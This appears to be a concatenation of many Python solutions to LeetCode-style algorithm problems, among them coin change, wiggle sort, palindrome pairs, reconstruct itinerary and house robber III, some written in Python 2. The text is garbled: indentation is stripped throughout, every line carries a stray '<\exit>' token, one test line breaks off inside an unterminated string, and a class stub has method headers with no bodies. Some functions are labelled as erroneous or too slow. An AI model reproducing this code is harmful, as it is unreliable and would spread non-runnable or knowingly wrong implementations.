import sys<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.dirs = [(-1, 0), (1, 0), (0, -1), (0, 1)]<\exit>
def shortestDistance(self, grid):<\exit>
m = len(grid)<\exit>
n = len(grid[0])<\exit>
acc = [[0 for _ in xrange(n)] for _ in xrange(m)]<\exit>
reachable = [[True for _ in xrange(n)] for _ in xrange(m)]<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if grid[i][j] > 0:<\exit>
reachable[i][j] = False<\exit>
acc[i][j] = sys.maxint<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if grid[i][j] == 1:<\exit>
self.bfs(grid, acc, reachable, i, j)<\exit>
mini = sys.maxint<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if acc[i][j] < mini and reachable[i][j]:<\exit>
mini = acc[i][j]<\exit>
return mini if mini != sys.maxint else -1<\exit>
def bfs(self, grid, acc, reachable, x, y):<\exit>
d = 0<\exit>
m, n = len(grid), len(grid[0])<\exit>
visited = [[False for _ in xrange(n)] for _ in xrange(m)]<\exit>
q = [(x, y)]<\exit>
visited[x][y] = True<\exit>
while q:<\exit>
l = len(q)<\exit>
for idx in xrange(l):<\exit>
i, j = q[idx]<\exit>
acc[i][j] += d<\exit>
for dir in self.dirs:<\exit>
I = i+dir[0]<\exit>
J = j+dir[1]<\exit>
if 0 <= I < m and 0 <= J < n and grid[I][J] == 0 and not visited[I][J]:<\exit>
q.append((I, J))<\exit>
visited[I][J] = True<\exit>
d += 1<\exit>
q = q[l:]<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if not visited[i][j]:<\exit>
reachable[i][j] = False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().shortestDistance(<\exit>
[[1, 1, 1, 1, 1, 0], [0, 0, 0, 0, 0, 1], [0, 1, 1, 0, 0, 1], [1, 0, 0, 1, 0, 1], [1, 0, 1, 0, 0, 1],<\exit>
[1, 0, 0, 0, 0, 1], [0, 1, 1, 1, 1, 0]]) == 88<\exit>
assert Solution().shortestDistance([[1, 2, 0]]) == -1<\exit>
assert Solution().shortestDistance([[1, 0, 2, 0, 1], [0, 0, 0, 0, 0], [0, 0, 1, 0, 0]]) == 7<\exit>
class Solution(object):<\exit>
def maxProduct(self, words):<\exit>
l = map(len, words)<\exit>
codes = map(self.encode, words)<\exit>
maxa = 0<\exit>
for i in xrange(len(codes)):<\exit>
for j in xrange(i+1, len(codes)):<\exit>
if codes[i] & codes[j] == 0:<\exit>
maxa = max(maxa, l[i]*l[j])<\exit>
return maxa<\exit>
def encode(self, x):<\exit>
ret = 0<\exit>
for c in x:<\exit>
ret |= 1 << (ord(c)-ord('a'))<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxProduct(["abcw", "baz", "foo", "bar", "xtfn", "abcdef"]) == 16<\exit>
import math<\exit>
class Solution(object):<\exit>
def bulbSwitch(self, n):<\exit>
cnt = int(math.sqrt(n))<\exit>
return cnt<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def generateAbbreviations(self, word):<\exit>
if not word:<\exit>
return [""]<\exit>
ret = []<\exit>
for i in xrange(len(word)+1):<\exit>
left_num = str(i) if i else ""<\exit>
for right in self.generateAbbreviations(word[i+1:]):<\exit>
cur = left_num + word[i:i+1] + right<\exit>
ret.append(cur)<\exit>
return ret<\exit>
class SolutionTLE(object):<\exit>
def __init__(self):<\exit>
self.cache = defaultdict(list)<\exit>
def generateAbbreviations(self, word):<\exit>
return list(set(self.dfs(word)))<\exit>
def dfs(self, word):<\exit>
if word not in self.cache:<\exit>
ret = []<\exit>
for l in xrange(1, len(word)+1):<\exit>
pivot = str(l)<\exit>
for i in xrange(len(word)-l+1):<\exit>
lefts = self.dfs(word[:i])<\exit>
rights = self.dfs(word[i+l:])<\exit>
for left in lefts:<\exit>
for right in rights:<\exit>
if left and left[-1].isdigit() or right and right[0].isdigit():<\exit>
continue<\exit>
ret.append(left+pivot+right)<\exit>
ret.append(word)<\exit>
self.cache[word] = ret<\exit>
return self.cache[word]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().generateAbbreviations("word") == ['word', 'wor1', 'wo1d', 'wo2', 'w1rd', 'w1r1', 'w2d', 'w3',<\exit>
'1ord', '1or1', '1o1d', '1o2', '2rd', '2r1', '3d', '4']<\exit>
class SolutionTLE(object):<\exit>
def maxNumber(self, nums1, nums2, k):<\exit>
maxa = []<\exit>
n1, n2 = len(nums1), len(nums2)<\exit>
for l1 in xrange(min(n1, k)+1):<\exit>
l2 = k - l1<\exit>
assert l2 >= 0<\exit>
A1, A2 = self.maxNumberSingle(nums1, l1), self.maxNumberSingle(nums2, l2)<\exit>
cur = self.maxNumberDual(A1, A2)<\exit>
if not maxa or self.eval(maxa) < self.eval(cur):<\exit>
maxa = cur<\exit>
return maxa<\exit>
def eval(self, lst):<\exit>
return int("".join(map(str, lst)))<\exit>
def maxNumberSingle(self, A, k):<\exit>
stk = []<\exit>
n = len(A)<\exit>
for i in xrange(n):<\exit>
while stk and len(stk)-1+(n-1-i+1) >= k and stk[-1] < A[i]: stk.pop()<\exit>
if len(stk) < k:<\exit>
stk.append(A[i])<\exit>
return stk<\exit>
def maxNumberDual(self, A1, A2):<\exit>
ret = []<\exit>
p1, p2 = 0, 0<\exit>
while p1 < len(A1) and p2 < len(A2):<\exit>
ahead1, ahead2 = p1, p2<\exit>
while ahead1 < len(A1) and ahead2 < len(A2) and A1[ahead1] == A2[ahead2]:<\exit>
ahead1, ahead2 = ahead1+1, ahead2+1<\exit>
if ahead2 >= len(A2) or (ahead1 < len(A1) and A1[ahead1] > A2[ahead2]):<\exit>
ret.append(A1[p1])<\exit>
p1 += 1<\exit>
else:<\exit>
ret.append(A2[p2])<\exit>
p2 += 1<\exit>
ret.extend(A1[p1:])<\exit>
ret.extend(A2[p2:])<\exit>
return ret<\exit>
import sys<\exit>
class Solution(object):<\exit>
def coinChange(self, coins, amount):<\exit>
if amount == 0:<\exit>
return 0<\exit>
F = [sys.maxint for _ in xrange(amount+1)]<\exit>
for k in coins:<\exit>
if k < amount+1:<\exit>
F[k] = 1<\exit>
for i in xrange(1, amount+1):<\exit>
if F[i] != sys.maxint:<\exit>
for k in coins:<\exit>
if i+k <= amount:<\exit>
F[i+k] = min(F[i+k], F[i]+1)<\exit>
return F[amount] if F[amount] != sys.maxint else -1<\exit>
class SolutionTLE(object):<\exit>
def coinChange(self, coins, amount):<\exit>
F = [sys.maxint for _ in xrange(amount+1)]<\exit>
for k in coins:<\exit>
if k < amount + 1:<\exit>
F[k] = 1<\exit>
for i in xrange(1, amount+1):<\exit>
for k in coins:<\exit>
if i-k > 0 and F[i-k] != sys.maxint:<\exit>
F[i] = min(F[i], F[i-k]+1)<\exit>
return F[amount] if F[amount] != sys.maxint else -1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().coinChange([243, 291, 335, 209, 177, 345, 114, 91, 313, 331], 7367) == 23<\exit>
class Solution(object):<\exit>
def countComponents(self, n, edges):<\exit>
V = [[] for _ in xrange(n)]<\exit>
for e in edges:<\exit>
V[e[0]].append(e[1])<\exit>
V[e[1]].append(e[0])<\exit>
visited = [False for _ in xrange(n)]<\exit>
cnt = 0<\exit>
for v in xrange(n):<\exit>
if not visited[v]:<\exit>
cnt += 1<\exit>
self.dfs(V, v, visited)<\exit>
return cnt<\exit>
def dfs(self, V, v, visited):<\exit>
visited[v] = True<\exit>
for nbr in V[v]:<\exit>
if not visited[nbr]:<\exit>
self.dfs(V, nbr, visited)<\exit>
from typing import List<\exit>
class Solution:<\exit>
def wiggleSort(self, nums: List[int]) -> None:<\exit>
n = len(nums)<\exit>
median = list(sorted(nums))[n//2]<\exit>
odd = 1<\exit>
even = n - 1 if (n - 1) % 2 == 0 else n - 2<\exit>
i = 0<\exit>
while i < n:<\exit>
if nums[i] < median:<\exit>
if i >= even and i % 2 == 0:<\exit>
i += 1<\exit>
continue<\exit>
nums[i], nums[even] = nums[even], nums[i]<\exit>
even -= 2<\exit>
elif nums[i] > median:<\exit>
if i <= odd  and i % 2 == 1:<\exit>
i += 1<\exit>
continue<\exit>
nums[i], nums[odd] = nums[odd], nums[i]<\exit>
odd += 2<\exit>
else:<\exit>
i += 1<\exit>
def find_kth(self, A, lo, hi, k):<\exit>
p = self.pivot(A, lo, hi)<\exit>
if k == p:<\exit>
return p<\exit>
elif k > p:<\exit>
return self.find_kth(A, p + 1, hi, k)<\exit>
else:<\exit>
return self.find_kth(A, lo, p, k)<\exit>
def pivot(self, A, lo, hi):<\exit>
p = lo<\exit>
closed = lo<\exit>
for i in range(lo + 1, hi):<\exit>
if A[i] < A[p]:<\exit>
closed += 1<\exit>
A[closed], A[i] = A[i], A[closed]<\exit>
A[closed], A[p] = A[p], A[closed]<\exit>
return closed<\exit>
if __name__ == "__main__":<\exit>
Solution().wiggleSort([1, 5, 1, 1, 6, 4])<\exit>
class Solution(object):<\exit>
def wiggleSort(self, A):<\exit>
n = len(A)<\exit>
median_idx = self.find_kth(A, 0, n, n/2)<\exit>
v = A[median_idx]<\exit>
idx = lambda i: (2*i+1) % (n|1)<\exit>
lt = -1<\exit>
hi = n<\exit>
i = 0<\exit>
while i < hi:<\exit>
if A[idx(i)] > v:<\exit>
lt += 1<\exit>
A[idx(lt)], A[idx(i)] = A[idx(i)], A[idx(lt)]<\exit>
i += 1<\exit>
elif A[idx(i)] == v:<\exit>
i += 1<\exit>
else:<\exit>
hi -= 1<\exit>
A[idx(hi)], A[idx(i)] = A[idx(i)], A[idx(hi)]<\exit>
def pivot(self, A, lo, hi, pidx=None):<\exit>
lt = lo-1<\exit>
gt = hi<\exit>
if not pidx: pidx = lo<\exit>
v = A[pidx]<\exit>
i = lo<\exit>
while i < gt:<\exit>
if A[i] < v:<\exit>
lt += 1<\exit>
A[lt], A[i] = A[i], A[lt]<\exit>
i += 1<\exit>
elif A[i] == v:<\exit>
i += 1<\exit>
else:<\exit>
gt -= 1<\exit>
A[gt], A[i] = A[i], A[gt]<\exit>
return lt, gt<\exit>
def find_kth(self, A, lo, hi, k):<\exit>
if lo >= hi: return<\exit>
lt, gt = self.pivot(A, lo, hi)<\exit>
if lt < k < gt:<\exit>
return k<\exit>
if k <= lt:<\exit>
return self.find_kth(A, lo, lt+1, k)<\exit>
else:<\exit>
return self.find_kth(A, gt, hi, k)<\exit>
class SolutionSort(object):<\exit>
def wiggleSort(self, nums):<\exit>
n = len(nums)<\exit>
A = sorted(nums)<\exit>
j, k = (n-1) / 2, n-1<\exit>
for i in xrange(len(nums)):<\exit>
if i % 2 == 0:<\exit>
nums[i] = A[j]<\exit>
j -= 1<\exit>
else:<\exit>
nums[i] = A[k]<\exit>
k -= 1<\exit>
if __name__ == "__main__":<\exit>
A = [3, 2, 1, 1, 3, 2]<\exit>
Solution().wiggleSort(A)<\exit>
print A<\exit>
class Solution(object):<\exit>
def maxSubArrayLen(self, A, k):<\exit>
m = {0: -1}<\exit>
maxa = 0<\exit>
s = 0<\exit>
for i in xrange(len(A)):<\exit>
s += A[i]<\exit>
t = s - k<\exit>
if t in m:<\exit>
maxa = max(maxa, i - m[t])<\exit>
if s not in m:<\exit>
m[s] = i<\exit>
return maxa<\exit>
class Solution(object):<\exit>
def countRangeSum(self, nums, lower, upper):<\exit>
if not nums: return 0<\exit>
def msort(A, lo, hi):<\exit>
if hi - lo <= 1: return 0<\exit>
mid = (lo + hi)/2<\exit>
cnt = msort(A, lo, mid) + msort(A, mid, hi)<\exit>
temp = []<\exit>
i = j = r = mid<\exit>
for l in xrange(lo, mid):<\exit>
while i < hi and A[i] - A[l] <  lower: i += 1<\exit>
while j < hi and A[j] - A[l] <= upper: j += 1<\exit>
cnt += j - i<\exit>
while r < hi and A[r] < A[l]:<\exit>
temp.append(A[r])<\exit>
r += 1<\exit>
temp.append(A[l])<\exit>
while r < hi:<\exit>
temp.append(A[r])<\exit>
r += 1<\exit>
A[lo:hi] = temp<\exit>
return cnt<\exit>
n = len(nums)<\exit>
F = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
F[i] = F[i-1] + nums[i-1]<\exit>
return msort(F, 0, n+1)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().countRangeSum([0, 0], 0, 0) == 3<\exit>
assert Solution().countRangeSum([-2, 5, -1], -2, 2) == 3<\exit>
class ListNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution(object):<\exit>
def oddEvenList(self, head):<\exit>
if not head:<\exit>
return<\exit>
ptr = head<\exit>
pre = head<\exit>
cnt = 1<\exit>
while pre and pre.next:<\exit>
cur = pre.next<\exit>
cnt += 1<\exit>
if cnt % 2 == 0:<\exit>
pre = pre.next<\exit>
else:<\exit>
start = ptr.next<\exit>
nxt = cur.next<\exit>
ptr.next = cur<\exit>
cur.next = start<\exit>
pre.next = nxt<\exit>
ptr = ptr.next<\exit>
return head<\exit>
def oddEvenListError(self, head):<\exit>
if not head:<\exit>
return<\exit>
ptr = head<\exit>
parity = ptr.val % 2<\exit>
pre = head<\exit>
while pre and pre.next:<\exit>
cur = pre.next<\exit>
if cur.val % 2 != parity:<\exit>
pre = pre.next<\exit>
else:<\exit>
start = ptr.next<\exit>
nxt = cur.next<\exit>
ptr.next = cur<\exit>
cur.next = start<\exit>
pre.next = nxt<\exit>
ptr = ptr.next<\exit>
return head<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.cache = None<\exit>
self.dirs = ((-1, 0), (1, 0), (0, -1), (0, 1),)<\exit>
def longestIncreasingPath(self, matrix):<\exit>
if not matrix: return 0<\exit>
m, n = len(matrix), len(matrix[0])<\exit>
self.cache = [[None for _ in xrange(n)] for _ in xrange(m)]<\exit>
gmax = 1<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
gmax = max(gmax, self.longest(matrix, i, j))<\exit>
return gmax<\exit>
def longest(self, matrix, i, j):<\exit>
if not self.cache[i][j]:<\exit>
m, n = len(matrix), len(matrix[0])<\exit>
maxa = 1<\exit>
for d in self.dirs:<\exit>
I, J = i + d[0], j + d[1]<\exit>
if 0 <= I < m and 0 <= J < n and matrix[I][J] > matrix[i][j]:<\exit>
maxa = max(maxa, 1 + self.longest(matrix, I, J))<\exit>
self.cache[i][j] = maxa<\exit>
return self.cache[i][j]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().longestIncreasingPath([<\exit>
[9, 9, 4],<\exit>
[6, 6, 8],<\exit>
[2, 1, 1]<\exit>
]) == 4<\exit>
class Solution(object):<\exit>
def minPatches(self, nums, n):<\exit>
cnt = 0<\exit>
cur_max = 0<\exit>
i = 0<\exit>
while cur_max < n:<\exit>
if i >= len(nums) or cur_max + 1 < nums[i]:<\exit>
cur_max += cur_max + 1<\exit>
cnt += 1<\exit>
else:<\exit>
cur_max += nums[i]<\exit>
i += 1<\exit>
return cnt<\exit>
def minPatches2(self, nums, n):<\exit>
nums = filter(lambda x: x <= n, nums)<\exit>
cnt = 0<\exit>
cur_max = 0<\exit>
for elt in nums:<\exit>
while cur_max + 1 < elt:<\exit>
cur_max += cur_max + 1<\exit>
cnt += 1<\exit>
cur_max += elt<\exit>
while cur_max < n:<\exit>
cur_max += cur_max + 1<\exit>
cnt += 1<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minPatches([1, 2, 2, 6, 34], 20) == 1<\exit>
class Solution(object):<\exit>
def isValidSerialization(self, preorder):<\exit>
stk = preorder.split(',')<\exit>
child_cnt = 0<\exit>
while stk:<\exit>
if stk[-1] == '#':<\exit>
stk.pop()<\exit>
child_cnt += 1<\exit>
else:<\exit>
child_cnt -= 2<\exit>
if child_cnt < 0:<\exit>
return False<\exit>
stk.pop()<\exit>
child_cnt += 1<\exit>
return not stk and child_cnt == 1<\exit>
def isValidSerializationSpace(self, preorder):<\exit>
stk = preorder.split(',')<\exit>
child_stk = []<\exit>
while stk:<\exit>
if stk[-1] == '#':<\exit>
child_stk.append(stk.pop())<\exit>
else:<\exit>
try:<\exit>
child_stk.pop()<\exit>
child_stk.pop()<\exit>
stk.pop()<\exit>
child_stk.append('#')<\exit>
except IndexError:<\exit>
return False<\exit>
return not stk and len(child_stk) == 1<\exit>
if __name__ == "__main__":<\exit>
Solution().isValidSerialization("9,3,4,<\exit>
import heapq<\exit>
from collections import defaultdict, deque<\exit>
class Solution(object):<\exit>
def findItinerary(self, tickets):<\exit>
G = defaultdict(list)<\exit>
for s, e in tickets:<\exit>
heapq.heappush(G[s], e)<\exit>
ret = deque()<\exit>
self.dfs(G, 'JFK', ret)<\exit>
return list(ret)<\exit>
def dfs(self, G, cur, ret):<\exit>
while G[cur]:<\exit>
self.dfs(G, heapq.heappop(G[cur]), ret)<\exit>
ret.appendleft(cur)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findItinerary([["JFK","KUL"],["JFK","NRT"],["NRT","JFK"]]) == ['JFK', 'NRT', 'JFK', 'KUL']<\exit>
import sys<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class BSTInfo(object):<\exit>
def __init__(self, sz, lo, hi):<\exit>
self.sz = sz<\exit>
self.lo = lo<\exit>
self.hi = hi<\exit>
MAX = sys.maxint<\exit>
MIN = -MAX - 1<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.gmax = 0<\exit>
def largestBSTSubtree(self, root):<\exit>
self.measure(root)<\exit>
return self.gmax<\exit>
def measure(self, root):<\exit>
if not root:<\exit>
return BSTInfo(0, MAX, MIN)<\exit>
left = self.measure(root.left)<\exit>
right = self.measure(root.right)<\exit>
if left.sz == -1 or right.sz == -1 or not left.hi <= root.val or not root.val <= right.lo:<\exit>
return BSTInfo(-1, MIN, MAX)<\exit>
sz = 1 + left.sz + right.sz<\exit>
self.gmax = max(self.gmax, sz)<\exit>
return BSTInfo(sz, min(root.val, left.lo), max(root.val, right.hi))<\exit>
class SolutionError(object):<\exit>
def __init__(self):<\exit>
self.gmax = 0<\exit>
def largestBSTSubtree(self, root):<\exit>
self.measure(root)<\exit>
return self.gmax<\exit>
def measure(self, root):<\exit>
if not root:<\exit>
return 0<\exit>
left = self.measure(root.left)<\exit>
right = self.measure(root.right)<\exit>
if root.left and not root.val >= root.left.val or root.right and not root.val <= root.right.val:<\exit>
return 0<\exit>
if root.left and left == 0 or root.right and right == 0:<\exit>
return 0<\exit>
ret = 1 + left + right<\exit>
self.gmax = max(self.gmax, ret)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
root = TreeNode(1)<\exit>
root.left = TreeNode(2)<\exit>
print Solution().largestBSTSubtree(root)<\exit>
from typing import List<\exit>
from bisect import bisect_left<\exit>
class Solution:<\exit>
def increasingTriplet(self, nums: List[int]) -> bool:<\exit>
F = [float('inf') for _ in range(3)]<\exit>
for n in nums:<\exit>
i = bisect_left(F, n)<\exit>
if i >= 2:<\exit>
return True<\exit>
F[i] = n<\exit>
return False<\exit>
import sys<\exit>
class Solution(object):<\exit>
def increasingTriplet(self, nums):<\exit>
min1 = sys.maxint<\exit>
min2 = sys.maxint<\exit>
for e in nums:<\exit>
if e < min1:<\exit>
min1 = e<\exit>
elif e != min1 and e < min2:<\exit>
min2 = e<\exit>
elif e > min2:<\exit>
return True<\exit>
return False<\exit>
def increasingTripletError(self, nums):<\exit>
stk = []<\exit>
for elt in nums:<\exit>
while stk and stk[-1] >= elt:<\exit>
stk.pop()<\exit>
stk.append(elt)<\exit>
if len(stk) >= 3:<\exit>
return True<\exit>
return False<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class TrieNode:<\exit>
def __init__(self):<\exit>
self.pali_prefix_idxes = []<\exit>
self.word_idx = None<\exit>
self.children = defaultdict(TrieNode)<\exit>
class Solution:<\exit>
def palindromePairs(self, words: List[str]) -> List[List[int]]:<\exit>
root = TrieNode()<\exit>
for idx, w in enumerate(words):<\exit>
cur = root<\exit>
for i in range(len(w) - 1, -1, -1):<\exit>
if self.is_palindrome(w, 0, i + 1):<\exit>
cur.pali_prefix_idxes.append(idx)<\exit>
cur = cur.children[w[i]]<\exit>
cur.pali_prefix_idxes.append(idx)<\exit>
cur.word_idx = idx<\exit>
ret = []<\exit>
for idx, w in enumerate(words):<\exit>
cur = root<\exit>
for i in range(len(w)):<\exit>
if self.is_palindrome(w, i, len(w)) and cur.word_idx is not None and cur.word_idx != idx:<\exit>
ret.append([idx, cur.word_idx])<\exit>
cur = cur.children.get(w[i], None)<\exit>
if cur is None:<\exit>
break<\exit>
else:<\exit>
for idx_j in cur.pali_prefix_idxes:<\exit>
if idx != idx_j:<\exit>
ret.append([idx, idx_j])<\exit>
return ret<\exit>
def is_palindrome(self, w, lo, hi):<\exit>
i = lo<\exit>
j = hi - 1<\exit>
while i < j:<\exit>
if w[i] != w[j]:<\exit>
return False<\exit>
i += 1<\exit>
j -= 1<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
assert Solution().palindromePairs(["a", ""]) == [[0,1],[1,0]]<\exit>
assert Solution().palindromePairs(["abcd","dcba","lls","s","sssll"]) == [[0,1],[1,0],[2,4],[3,2]]<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.cache_rob = {}<\exit>
self.cache_notrob = {}<\exit>
def rob(self, root):<\exit>
if root is None:<\exit>
return 0<\exit>
if root not in self.cache_rob:<\exit>
val = max(<\exit>
self.notrob(root),<\exit>
root.val + self.notrob(root.left) + self.notrob(root.right)<\exit>
)<\exit>
self.cache_rob[root] = val<\exit>
return self.cache_rob[root]<\exit>
def notrob(self, root):<\exit>
if root is None:<\exit>
return 0<\exit>
if root not in self.cache_notrob:<\exit>
val = (<\exit>
self.rob(root.left) +<\exit>
self.rob(root.right)<\exit>
)<\exit>
self.cache_notrob[root] = val<\exit>
return self.cache_notrob[root]<\exit>
class SolutionTLE(object):<\exit>
def rob(self, root):<\exit>
if root is None:<\exit>
return 0<\exit>
return max(<\exit>
self.dorob(root),<\exit>
self.notrob(root)<\exit>
)<\exit>
def dorob(self, root):<\exit>
if root is None:<\exit>
return 0<\exit>
return (<\exit>
root.val +<\exit>
self.notrob(root.left) +<\exit>
self.notrob(root.right)<\exit>
)<\exit>
def notrob(self, root):<\exit>
if root is None:<\exit>
return 0<\exit>
return (max(self.notrob(root.left), self.rob(root.left)) +<\exit>
max(self.notrob(root.right), self.rob(root.right)))<\exit>
class Solution(object):<\exit>
def countBits(self, num):<\exit>
ret = [0]<\exit>
i = 0<\exit>
hi = len(ret)<\exit>
while len(ret) < num + 1:<\exit>
if i == hi:<\exit>
i = 0<\exit>
hi = len(ret)<\exit>
ret.append(1+ret[i])<\exit>
i += 1<\exit>
return ret<\exit>
class NestedInteger(object):<\exit>
def isInteger(self):<\exit>
def getInteger(self):<\exit>
def getList(self):<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.sum = 0<\exit>
def depthSum(self, nestedList):<\exit>
for elt in nestedList:<\exit>
self.dfs(elt, 1)<\exit>
return self.sum<\exit>
def dfs(self, ni, depth):<\exit>
if ni.isInteger():<\exit>
self.sum += ni.getInteger() * depth<\exit>
else:<\exit>
lst = ni.getList()<\exit>
for elt in lst:<\exit>
self.dfs(elt, depth + 1)<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def lengthOfLongestSubstringKDistinct(self, s, k):<\exit>
st = 0<\exit>
counter = defaultdict(int)<\exit>
maxa = 0<\exit>
for idx, val in enumerate(s):<\exit>
if counter[val] == 0:<\exit>
k -= 1<\exit>
counter[val] += 1<\exit>
while k < 0:<\exit>
counter[s[st]] -= 1<\exit>
if counter[s[st]] == 0:<\exit>
k += 1<\exit>
st += 1<\exit>
maxa = max(maxa, idx - st + 1)<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
assert Solution().lengthOfLongestSubstringKDistinct("eceba", 2) == 3<\exit>
class NestedInteger(object):<\exit>
def isInteger(self):<\exit>
return True<\exit>
def getInteger(self):<\exit>
return 0<\exit>
def getList(self):<\exit>
return []<\exit>
class NestedIterator(object):<\exit>
def __init__(self, nestedList):<\exit>
self.stk = [[nestedList, 0]]<\exit>
def next(self):<\exit>
nl, idx = self.stk[-1]<\exit>
nxt = nl[idx].getInteger()<\exit>
self.stk[-1][1] = idx + 1<\exit>
return nxt<\exit>
def hasNext(self):<\exit>
while self.stk:<\exit>
nl, idx = self.stk[-1]<\exit>
if idx < len(nl):<\exit>
ni = nl[idx]<\exit>
if ni.isInteger():<\exit>
return True<\exit>
else:<\exit>
self.stk[-1][1] = idx + 1<\exit>
nxt_nl = ni.getList()<\exit>
self.stk.append([nxt_nl, 0])<\exit>
else:<\exit>
self.stk.pop()<\exit>
return False<\exit>
class NestedIteratorVerbose(object):<\exit>
def __init__(self, nestedList):<\exit>
self.nl_stk = [nestedList]<\exit>
self.idx_stk = [0]<\exit>
def next(self):<\exit>
if self.hasNext():<\exit>
nl = self.nl_stk[-1]<\exit>
idx = self.idx_stk[-1]<\exit>
nxt = nl[idx]<\exit>
self.idx_stk[-1] = idx + 1<\exit>
return nxt<\exit>
raise StopIteration()<\exit>
def hasNext(self):<\exit>
while self.nl_stk:<\exit>
nl = self.nl_stk[-1]<\exit>
idx = self.idx_stk[-1]<\exit>
if idx < len(nl):<\exit>
ni = nl[idx]<\exit>
if ni.isInteger():<\exit>
return True<\exit>
else:<\exit>
self.idx_stk[-1] = idx+1<\exit>
nxt_nl = ni.getList()<\exit>
nxt_idx = 0<\exit>
self.nl_stk.append(nxt_nl)<\exit>
self.idx_stk.append(nxt_idx)<\exit>
else:<\exit>
self.nl_stk.pop()<\exit>
self.idx_stk.pop()<\exit>
return False<\exit>
class Solution(object):<\exit>
def isPowerOfFour(self, num):<\exit>
if num < 1:<\exit>
return False<\exit>
if num & num -1 != 0:<\exit>
return False<\exit>
return num % 3 == 1<\exit>
def isPowerOfFourNaive(self, num):<\exit>
if num < 1:<\exit>
return False<\exit>
if num & num-1 != 0:<\exit>
return False<\exit>
while True:<\exit>
if num == 0:<\exit>
return False<\exit>
elif num == 1:<\exit>
return True<\exit>
num >>= 2<\exit>
class Solution(object):<\exit>
def integerBreak(self, n):<\exit>
F = [None for _ in xrange(n+1)]<\exit>
F[1] = 1<\exit>
for i in xrange(2, n+1):<\exit>
F[i] = max(<\exit>
max(F[j] * F[i-j], j * F[i-j], F[j] * (i-j), j * (i-j))<\exit>
for j in xrange(1, i/2)<\exit>
)<\exit>
return F[n]<\exit>
class Solution(object):<\exit>
def reverseString(self, s):<\exit>
return s[::-1]<\exit>
class Solution(object):<\exit>
def reverseVowels(self, s):<\exit>
vowels = set(['a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U'])<\exit>
s = list(s)<\exit>
j = len(s) - 1<\exit>
i = 0<\exit>
while i < j:<\exit>
if s[i] in vowels:<\exit>
while s[j] not in vowels: j -= 1<\exit>
s[i], s[j] = s[j], s[i]<\exit>
j -= 1<\exit>
i += 1<\exit>
return "".join(s)<\exit>
from collections import deque<\exit>
class MovingAverage(object):<\exit>
def __init__(self, size):<\exit>
self.size = size<\exit>
self.q = deque()<\exit>
self.sum = 0<\exit>
def next(self, val):<\exit>
self.q.append(val)<\exit>
self.sum += val<\exit>
if len(self.q) > self.size:<\exit>
self.sum -= self.q.popleft()<\exit>
return float(self.sum) / len(self.q)<\exit>
from collections import defaultdict<\exit>
import heapq<\exit>
class Counter(object):<\exit>
def __init__(self, val, cnt):<\exit>
self.val = val<\exit>
self.cnt = cnt<\exit>
def __cmp__(self, other):<\exit>
return self.cnt - other.cnt<\exit>
class Solution(object):<\exit>
def topKFrequent(self, nums, K):<\exit>
cnt = defaultdict(int)<\exit>
for e in nums:<\exit>
cnt[e] += 1<\exit>
lst = []<\exit>
for k, v in cnt.items():<\exit>
lst.append(Counter(k, v))<\exit>
ret = []<\exit>
for elt in lst:<\exit>
if len(ret) < K:<\exit>
heapq.heappush(ret, elt)<\exit>
else:<\exit>
heapq.heappushpop(ret, elt)<\exit>
return map(lambda x: x.val, ret)<\exit>
class TicTacToe(object):<\exit>
def __init__(self, n):<\exit>
self.n = n<\exit>
self.rows_count = [0 for _ in xrange(n)]<\exit>
self.cols_count = [0 for _ in xrange(n)]<\exit>
self.diag_count = 0<\exit>
self.diag_inv_count = 0<\exit>
def move(self, row, col, player):<\exit>
delta = -1 if player == 1 else 1<\exit>
self.cols_count[col] += delta<\exit>
self.rows_count[row] += delta<\exit>
if col == row:<\exit>
self.diag_count += delta<\exit>
if col + row == self.n - 1:<\exit>
self.diag_inv_count += delta<\exit>
is_win = lambda count: delta * count == self.n<\exit>
if any(map(is_win, [self.rows_count[row], self.cols_count[col], self.diag_count, self.diag_inv_count])):<\exit>
return player<\exit>
return 0<\exit>
class Solution(object):<\exit>
def intersection(self, nums1, nums2):<\exit>
return list(set(nums1).intersection(set(nums2)))<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def intersect(self, nums1, nums2):<\exit>
h1, h2 = defaultdict(int), defaultdict(int)<\exit>
for a in nums1:<\exit>
h1[a] += 1<\exit>
for b in nums2:<\exit>
h2[b] += 1<\exit>
ret = []<\exit>
for k, v in h1.items():<\exit>
cnt = min(v, h2[k])<\exit>
ret.extend([k]*cnt)<\exit>
return ret<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.skip = [[None for _ in xrange(10)] for _ in xrange(10)]<\exit>
self.skip[1][3], self.skip[3][1] = 2, 2<\exit>
self.skip[1][7], self.skip[7][1] = 4, 4<\exit>
